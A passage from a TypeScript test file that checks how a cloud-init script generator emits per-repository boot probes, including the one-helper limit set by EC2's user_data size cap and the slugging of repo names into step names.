  // "The process stayed alive for three seconds" is not evidence the app
  // works, and reporting it as a pass would be the lie this piece removes.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          runCommand: "pnpm dev",
        },
      ],
    }),
  );
  assert.ok(!script.includes("nexus_boot_probe"));
  // …and the helper is not emitted either, since nothing would call it.
  assert.ok(!script.includes("nexus_boot_probe()"));
});

test("no run command means no probe, whatever the port says", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        { name: "app", repoUrl: "https://github.com/acme/app.git", runPort: 3000 },
      ],
    }),
  );
  assert.ok(!script.includes("nexus_boot_probe"));
});

test("each repo with a port gets its own probe", () => {
  // Multi-repo is the ordinary case — a front end and an API — and each one
  // has to be proven separately. A single probe against "the" app node would
  // pass a project whose second service does not build.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "api",
          repoUrl: "https://github.com/acme/api.git",
          isMain: true,
          runCommand: "pnpm dev",
          runPort: 8000,
        },
        {
          name: "web",
          repoUrl: "https://github.com/acme/web.git",
          runCommand: "pnpm dev",
          runPort: 3000,
        },
      ],
    }),
  );
  assert.ok(script.includes("nexus_boot_probe 'boot:api' 'api'"));
  assert.ok(script.includes("nexus_boot_probe 'boot:web' 'web'"));
  assert.ok(script.includes("'8000'"));
  assert.ok(script.includes("'3000'"));
  // The helper is emitted once, not per repo: it is long, and EC2 caps
  // user_data at 16KB.
  assert.equal(script.split("nexus_boot_probe() {").length - 1, 1);
});

test("a repo name with spaces is slugged into the step name", () => {
  // assertStepName would throw on the raw name; the checkout directory is
  // already slugged, so the step and the path agree.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "My App (v2)",
          repoUrl: "https://github.com/acme/app.git",
          runCommand: "pnpm dev",
          runPort: 3000,
        },
      ],
    }),
  );
  const probe = script
    .split("\n")
    .find((l) => l.trim().startsWith("nexus_boot_probe '"));
  assert.ok(probe, "no probe emitted");
  // Same slug as the checkout it cds into.
  const slug = probe!.match(/nexus_boot_probe 'boot:([^']+)'/)?.[1];
  assert.ok(slug && /^[a-z0-9-]+$/.test(slug), `bad slug: ${slug}`);
  assert.ok(probe!.includes(`'/opt/nexus/${slug}'`));
});
